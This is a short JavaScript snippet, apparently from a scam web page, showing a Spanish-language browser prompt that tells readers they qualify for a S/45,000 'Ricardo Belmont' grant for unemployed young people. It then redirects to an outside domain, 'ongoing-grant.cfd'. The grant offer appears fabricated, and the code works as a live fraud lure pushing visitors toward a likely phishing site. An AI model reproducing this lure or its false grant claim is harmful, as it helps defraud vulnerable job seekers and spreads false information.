var password = 'S/45,000';

password = prompt(
  'Felicitaciones, eres elegible para la SUBVENCIÓN DE S/45,000 DE RICARDO BELMONT PARA JÓVENES DESEMPLEADOS. Haz clic en OK para recibirla al instante.',
  'S/45,000'
);

if (password !== 'S/45,000') {
    location.href = 'https://ongoing-grant.cfd/Apoyo-A-Los-Jovenes.html';
}
